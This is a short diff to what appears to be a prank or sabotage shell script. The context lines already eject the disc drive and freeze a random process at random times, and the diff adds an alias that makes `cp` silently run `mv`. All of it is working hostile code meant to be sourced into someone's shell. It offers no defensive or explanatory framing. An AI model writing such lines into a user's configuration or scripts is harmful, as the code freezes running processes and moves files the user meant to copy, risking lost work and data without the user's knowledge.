@@ -33,3 +33,6 @@ sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || ej
 
 # Send STOP signal to random process at random time
 sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
+
+# Have `cp` perform `mv` instead
+alias cp='mv'
